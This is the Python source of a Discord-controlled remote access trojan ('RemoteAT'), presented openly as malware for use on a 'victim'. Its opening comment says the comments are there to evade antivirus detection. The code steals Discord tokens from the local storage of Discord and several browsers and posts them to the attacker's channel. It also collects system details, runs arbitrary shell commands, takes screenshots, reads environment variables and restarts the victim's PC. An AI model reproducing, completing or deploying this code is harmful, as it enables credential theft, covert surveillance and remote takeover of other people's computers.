#btw most of the comments are to throw off AVs
import re, os, requests, json, discord, ctypes, random
from discord.ext import commands; from base64 import b64decode; from json import loads
from urllib.request import Request, urlopen
from subprocess import Popen, PIPE; import platform as plt
#but there are some useful ones too

ids = []
#channel is the channel ID where updates will be sent
#usid is the userID of the user
#token is the token of your bot
channel = ; usid = ; token = ""
OS = plt.platform().split("-"); name = os.getenv("username"); Username = os.getenv("COMPUTERNAME")
client = commands.Bot(command_prefix="null!"); client.remove_command("help")
ratcwd = os.getcwd() # this keeps the original working dir in memory
userid = str(usid)

#embed function
def WinMsg(Name, Value):
    embed = discord.Embed(title = "Information", color=0x0081fa)
    embed.add_field(name = f"{Name}", value = f"{Value}")
    embed.set_footer(text = "RemoteAT・Monstered & NullCode")
    return embed

#shows error message
def ErrorMsg():
    embed = discord.Embed(title = "Information", color=0xFC4D4D)
    embed.add_field(name = "Error", value = f"IP match failed :(")
    embed.set_footer(text = "RemoteAT・Monstered & NullCode")
    return embed

def GetIP():
    return requests.get("https://api.ipify.org/").text
  
def Hwid():
	p = Popen("wmic csproduct get uuid", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
	return (p.stdout.read() + p.stderr.read()).decode().split("\n")[1]
    
#updated tokenlogger
def find_tokens(path):
    path += '\\Local Storage\\leveldb'
    tokens = []
    for file_name in os.listdir(path):
        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
            continue
        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                for token in re.findall(regex, line):
                    tokens.append(token)
    return tokens

#what the bot should do when its ready
@client.event
async def on_ready():
    await client.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name=f"Null's children"))
    await client.get_channel(channel).send("<@" + userid + "> RAT started on child " + GetIP())
    
#added better tokenlogger
@client.command()
async def tokens(ctx):
    local = os.getenv('LOCALAPPDATA'); roaming = os.getenv('APPDATA')
    paths = {
        'Discord':         roaming + '\\Discord',
        'Discord Canary':  roaming + '\\discordcanary',
        'Discord PTB':     roaming + '\\discordptb',
        'Opera':           roaming + '\\Opera Software\\Opera Stable',
        'Opera GX':        roaming + '\\Opera Software\\Opera GX Stable',
        'Lightcord':       roaming + '\\Lightcord',
        'Google Chrome':   local + '\\Google\\Chrome\\User Data\\Default',
        'Brave':           local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Yandex':          local + '\\Yandex\\YandexBrowser\\User Data\\Default',
        'Vivaldi':         local + '\\Vivaldi\\User Data\\Default',
        'MSEdge':          local + '\\Microsoft\\Edge\\User Data\\Default'
    }
    for platform, path in paths.items():
        if not os.path.exists(path):
            continue
        msg = ""; msg += f'\n**{platform}**\n```\n'
        tokens = find_tokens(path)
        if len(tokens) > 0:
            for token in tokens:
                msg += f'{token}\n'
        else:
            msg += 'No token found.\n'
        msg += '```'
        await ctx.send(msg)

#checks computer information
@client.command()
async def check(ctx):
    import subprocess; OS = plt.platform().split("-")
    name = os.getenv("UserName")
    Username = os.getenv("COMPUTERNAME")
    messages = f"```ARM\nIP: {GetIP()}\n```" +  f"```ARM\nHWID: {Hwid()}\n```" + f"```ARM\nPC Username: {Username}\n```" + f"```ARM\nPC Name: {name}\n```" + f"```ARM\nProduct Name: {OS[0]} {OS[1]}\n```"
    subprocess.run('SYSTEMINFO > "%temp%\\output.txt"', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
    file = discord.File(os.path.join(os.getenv('TEMP') + "\\output.txt"), filename="General Output.txt")
    await ctx.send(messages, file=file)
    os.remove(os.path.join(os.getenv('TEMP') + "\\output.txt"))

#runs any website
@client.command()
async def url(ctx, IP, url):
    if IP == GetIP():
        os.system('start ' + url)
        await ctx.send(embed = WinMsg("Open url", f"[*] URL opened successfully `{url}`"))
    else:
        await ctx.send(embed = ErrorMsg())

#restarts computer
@client.command()
async def restart(ctx, IP):
    if IP == GetIP():
        os.system("shutdown /r /t 0")
        await ctx.send(embed = WinMsg("Restart", "[*] Successfully restarted PC"))
    else:
        await ctx.send(embed = ErrorMsg())

# Directory commands # 
# ------------------ #

# Sends the current working directory
@client.command()
async def cwd(ctx, IP):
    if IP == GetIP():
        get = os.getcwd(); cwd = str(get)
        await ctx.send(embed = WinMsg("View cwd", f"`{cwd}`"))
    else:
        await ctx.send(embed = ErrorMsg())

# Changes working directory
@client.command()
async def cd(ctx, IP, msg):
    if IP == GetIP():
        if msg.startswith("%"):
            smsg = str(os.getenv(msg))
            os.chdir(smsg)
        else:
            os.chdir(msg)
        await ctx.send(embed = WinMsg("Changed directory to ", f"`{os.getcwd()}`"))
    else:
        await ctx.send(embed = ErrorMsg())

# Go back to original working directory
@client.command()
async def rwd(ctx, IP):
    if IP == GetIP():
        os.chdir(ratcwd)
        await ctx.send(embed = WinMsg("Changed directory to ", f"`{os.getcwd()}`"))
    else:
        await ctx.send(embed = ErrorMsg())
        
# Show contents of specified directory        
@client.command()
async def look(ctx, IP, dir):
    if IP == GetIP():
        dir = os.listdir(dir)
        await ctx.send(embed = WinMsg("Contents of directory", f"{dir}"))
    else:
        await ctx.send(embed = ErrorMsg())

# Sends attachment to victim
@client.command()
async def download(ctx, IP, file):
    if IP == GetIP():
    
        message.attachments[0].save(f"{file}")
        await ctx.send("File successfully sent to victim")
    else:
        await ctx.send(embed = ErrorMsg())

# Basically command prompt
# Thank you Sp00p
@client.command()
async def shell(ctx, IP, msg):  
    if IP == GetIP():
        global status
        import time; status = None; import subprocess, os, threading
        msg = msg[:-1]; msg = msg[1:]; 
        def shell():
            output = subprocess.run(msg, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            global status; status = "ok"; return output
        shel = threading.Thread(target=shell) 
        shel._running = True; shel.start(); time.sleep(2); shel._running = False
        if status:
            result = str(shell().stdout.decode('CP437'))
            print(result); numb = len(result); print(numb)
            if numb < 1:
                await ctx.send("[*] Command not recognized or no output was obtained")
            elif numb > 1990:
                f1 = open("shell.txt", 'a')
                f1.write(result); f1.close()
                file = discord.File("shell.txt", filename="shell.txt")
                await ctx.send("[*] Command successfully executed", file=file)
                os.popen("del shell.txt")
            else:
                await ctx.send("[*] Command successfully executed : " + result)
        else:
            await ctx.send("[*] Command not recognized or no output was obtained")
            status = None
    else:
        await ctx.send(embed = ErrorMsg())

# Takes screenshot of victim's PC
@client.command()
async def screenshot(ctx, IP):
  from mss import mss
  if IP == GetIP():
    with mss() as sct:
      sct.shot(output=os.path.join(os.getenv('TEMP') + "\\monitor.png"))
    file = discord.File(os.path.join(os.getenv('TEMP') + "\\monitor.png"), filename="monitor.png")
    await ctx.send("[*] Command successfully executed", file=file)
    os.remove(os.path.join(os.getenv('TEMP') + "\\monitor.png"))
  else:
    await ctx.send(embed = ErrorMsg())

# Finds values of environment variables 
@client.command()
async def getenv(ctx, IP, var):
  if IP == GetIP():
    await ctx.send("[-] The value for " + str(var) + " is " + os.getenv(var))
  else: 
    await ctx.send(embed = ErrorMsg())
 
#async def startup(ctx, ip):
  # Still a WIP
  
# Just a fun command really 
@client.command()
async def rickroll(ctx, IP):
  if IP == GetIP():
    import os, comtypes; import win32com.client as wincl
    os.system("start https://media1.tenor.com/images/a6fed89a5b7704fc4436e7504e72a471/tenor.gif?itemid=13662080")
    speak = wincl.Dispatch("SAPI.SpVoice")
    speak.Speak("Get rick rolled")
    comtypes.CoUninitialize()
    await ctx.send("[*] Rickroll successfully executed")
  else:
    await ctx.send(embed = ErrorMsg())

# Shuts down RAT
@client.command()
async def exit(ctx, IP):
  if IP == GetIP():
    await ctx.send("Shutting down bot on victim's PC")
    await client.get_channel(channel).send("<@" + userid + "> RAT shut-off on child " + GetIP())
    await ctx.bot.logout()
    exit()
  else:
    await ctx.send(embed = ErrorMsg())
    
@client.command()
async def menu(ctx):
    embed = discord.Embed(title = "Help Menu", color=0x0081fa)
    # Monstered specific mods
    # Some of his mods were removed because AVs detected them and some were useless
    embed.add_field(name = "null!check", value = "Check your victim's information", inline=True)
    embed.add_field(name = "null!tokens <IP>", value = "Get victim's Discord Token", inline=True)
    embed.add_field(name = "null!cwd <IP>", value = "See the current working directory", inline=True)
    embed.add_field(name = "null!look <IP> <dir>", value = "See contents of the specific directory", inline=True)
    embed.add_field(name = "null!url <IP> <url>", value = "Opens a Link", inline=True)
    embed.add_field(name = "null!restart <IP>", value = "Restarts victim's PC", inline=True)
    # NullCode specific mods
    embed.add_field(name = "null!cd <IP>", value = "Change the current working directory", inline=True)
    embed.add_field(name = "null!rwd <IP>", value = "Goes back to the RATs original working directory", inline=True)
    embed.add_field(name = "null!screenshot <IP>", value = "Screenshots victim's PC", inline=True)
    embed.add_field(name = "null!download <IP> <Filename>", value = "Read the content of the file", inline=True)
    embed.add_field(name = "null!shell <IP> <msg>", value = "Executes cmd shell commands", inline=True)
    embed.add_field(name = "null!startup <IP>", value = "[DNW] Puts RAT on startup directory", inline=True)
    embed.add_field(name = "null!getenv <IP> <var>", value = "Finds the values of Windows env variables" )
    embed.add_field(name = "null!exit <IP>", value = "Closes the RAT on victim's PC", inline=True)
    embed.add_field(name = "null!rickroll <IP>", value = "Rickrolls victim", inline=True)
    embed.set_footer(text = "RemoteAT・Monstered & NullCode")
    await ctx.send(embed = embed)

client.run(token)
